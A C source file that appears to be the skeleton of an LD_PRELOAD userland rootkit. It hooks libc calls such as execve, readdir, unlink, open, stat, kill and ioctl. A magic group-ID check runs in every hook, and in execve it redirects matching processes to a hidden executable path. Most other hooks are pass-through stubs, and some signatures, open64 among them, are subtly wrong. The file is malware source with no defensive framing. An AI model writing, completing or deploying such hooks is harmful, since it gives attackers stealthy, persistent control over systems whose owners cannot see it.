#define _GNU_SOURCE
#include <config.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pcap.h>

int good_gid() {
    gid_t gid = getgid();
    if (gid == GID) {
        return 1;
    }
    return 0;
}

// EXECVE

int (*o_execve)(const char *, char *const argv[], char *const envp[]);
int execve(const char *path, char *const argv[], char *const envp[]) {
#ifdef VERBOSE
	printf("execve called\n");
#endif
    if(!o_execve)
        o_execve = dlsym(RTLD_NEXT, "execve");

    if (good_gid() == 1) {
        return o_execve(HIDDEN_EXEC_PATH, argv, envp);
    }

    return o_execve(path, argv, envp);
}

// READDIR

struct dirent *(*o_readdir)(DIR *);
struct dirent *readdir(DIR *p) {
#ifdef VERBOSE
    printf("readdir called\n");
#endif
    if(!o_readdir)
        o_readdir = dlsym(RTLD_NEXT, "readdir");

    if (good_gid() == 1) {
        return o_readdir(p);
    }

    struct dirent *dir = o_readdir(p);
    return dir;
}

// READDIR64

struct dirent64 *(*o_readdir64)(DIR *);
struct dirent64 *readdir64(DIR *p) {
#ifdef VERBOSE
    printf("readdir64 called\n");
#endif
    if(!o_readdir64)
        o_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    if (good_gid() == 1) {
        return o_readdir64(p);
    }

    struct dirent64 *dir = o_readdir64(p);
    return dir;
}

// UNLINK

int (*o_unlink)(const char *);
int unlink(const char *pathname) {
#ifdef VERBOSE
    printf("unlink called\n");
#endif
    if(!o_unlink)
        o_unlink = dlsym(RTLD_NEXT, "unlink");

    if (good_gid() == 1) {
        return o_unlink(pathname);
    }

    return o_unlink(pathname);
}

// UNLINKAT

int (*o_unlinkat)(int, const char *, int);
int unlinkat(int dirfd, const char * pathname, int flags) {
#ifdef VERBOSE
    printf("unlinkat called\n");
#endif
    if(!o_unlinkat)
        o_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

    if (good_gid() == 1) {
        return o_unlinkat(dirfd, pathname, flags);
    }

    return o_unlinkat(dirfd, pathname, flags);
}

// WRITE
ssize_t (*o_write)(int, const void *, size_t);
ssize_t write(int fd, const void *xbuf, size_t count) {
#ifdef VERBOSE
    printf("write called\n");
#endif
    if(!o_write)
        o_write = dlsym(RTLD_NEXT, "write");

    if (good_gid() == 1) {
        return o_write(fd, xbuf, count);
    }

    return o_write(fd, xbuf, count);
}

// READ

ssize_t (*o_read)(int, void *, size_t);
ssize_t read(int fd, void *xbuf, size_t count) {
#ifdef VERBOSE
    printf("read called\n");
#endif
    if(!o_read)
        o_read = dlsym(RTLD_NEXT, "read");

    if (good_gid() == 1) {
        return o_read(fd, xbuf, count);
    }

    return o_read(fd, xbuf, count);
}

// kill

int (*o_kill)(pid_t, int);
int kill(pid_t pid, int sig) {
#ifdef VERBOSE
    printf("kill called\n");
#endif
    if(!o_kill)
        o_kill = dlsym(RTLD_NEXT, "kill");

    if (good_gid() == 1) {
        return o_kill(pid, sig);
    }

    return o_kill(pid, sig);
}

// openat

int (*o_openat)(int, const char *, int, ...);
int openat(int dirfd, const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("openat called\n");
#endif
    if(!o_openat)
        o_openat = dlsym(RTLD_NEXT, "openat");

    if (good_gid() == 1) {
        return o_openat(dirfd, path, flags);
    }

    return o_openat(dirfd, path, flags);
}

// openat64

int (*o_openat64)(int, const char *, int, ...);
int open64(const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("openat64 called\n");
#endif
    if(!o_openat64)
        o_openat64 = dlsym(RTLD_NEXT, "openat64");

    if (good_gid() == 1) {
        return o_openat64(AT_FDCWD, path, flags);
    }

    return o_openat64(AT_FDCWD, path, flags);
}

// open

int (*o_open)(const char *, int, ...);
int open(const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("open called\n");
#endif
    if(!o_open)
        o_open = dlsym(RTLD_NEXT, "open");

    if (good_gid() == 1) {
        return o_open(path, flags);
    }

    return o_open(path, flags);
}

// fopen

FILE *(*o_fopen)(const char *, const char *);
FILE *fopen(const char *path, const char *mode) {
#ifdef VERBOSE
    printf("fopen called\n");
#endif
    if(!o_fopen)
        o_fopen = dlsym(RTLD_NEXT, "fopen");

    if (good_gid() == 1) {
        return o_fopen(path, mode);
    }

    return o_fopen(path, mode);
}

// pathmatch

int (*o_fnmatch)(const char *, const char *, int);
int fnmatch(const char *pattern, const char *string, int flags) {
#ifdef VERBOSE
    printf("fnmatch called\n");
#endif
    if(!o_fnmatch)
        o_fnmatch = dlsym(RTLD_NEXT, "fnmatch");

    if (good_gid() == 1) {
        return o_fnmatch(pattern, string, flags);
    }

    return o_fnmatch(pattern, string, flags);
}

//shutdown

int (*o_shutdown)(int, int);
int shutdown(int sockfd, int how) {
#ifdef VERBOSE
    printf("shutdown called\n");
#endif
    if(!o_shutdown)
        o_shutdown = dlsym(RTLD_NEXT, "shutdown");

    if (good_gid() == 1) {
        return o_shutdown(sockfd, how);
    }

    return o_shutdown(sockfd, how);
}

// opendir

DIR *(*o_opendir)(const char *);
DIR *opendir(const char *name) {
#ifdef VERBOSE
    printf("opendir called\n");
#endif
    if(!o_opendir)
        o_opendir = dlsym(RTLD_NEXT, "opendir");

    if (good_gid() == 1) {
        return o_opendir(name);
    }

    return o_opendir(name);
}

// stat

int (*o_stat)(const char *, struct stat *);
int stat(const char *pathname, struct stat *statbuf) {
#ifdef VERBOSE
    printf("stat called\n");
#endif
    if(!o_stat)
        o_stat = dlsym(RTLD_NEXT, "stat");

    if (good_gid() == 1) {
        return o_stat(pathname, statbuf);
    }

    return o_stat(pathname, statbuf);
}

// statfs

int (*o_statfs)(const char *, struct statfs *);
int statfs(const char *pathname, struct statfs *buf) {
#ifdef VERBOSE
    printf("statfs called\n");
#endif
    if(!o_statfs)
        o_statfs = dlsym(RTLD_NEXT, "statfs");

    if (good_gid() == 1) {
        return o_statfs(pathname, buf);
    }

    return o_statfs(pathname, buf);
}

// xstat

int (*o_xstat)(int, const char *, struct stat *);
int __xstat(int ver, const char *pathname, struct stat *statbuf) {
#ifdef VERBOSE
    printf("xstat called\n");
#endif
    if(!o_xstat)
        o_xstat = dlsym(RTLD_NEXT, "__xstat");

    if (good_gid() == 1) {
        return o_xstat(ver, pathname, statbuf);
    }

    return o_xstat(ver, pathname, statbuf);
}

// lstat

int (*o_lstat)(const char *, struct stat *);
int lstat(const char *pathname, struct stat *statbuf) {
#ifdef VERBOSE
    printf("lstat called\n");
#endif
    if(!o_lstat)
        o_lstat = dlsym(RTLD_NEXT, "lstat");

    if (good_gid() == 1) {
        return o_lstat(pathname, statbuf);
    }

    return o_lstat(pathname, statbuf);
}

// ioctl

int (*o_ioctl)(int, unsigned long, ...);
int ioctl(int fd, unsigned long request, ...) {
#ifdef VERBOSE
    printf("ioctl called\n");
#endif
    if(!o_ioctl)
        o_ioctl = dlsym(RTLD_NEXT, "ioctl");

    if (good_gid() == 1) {
        return o_ioctl(fd, request);
    }

    return o_ioctl(fd, request);
}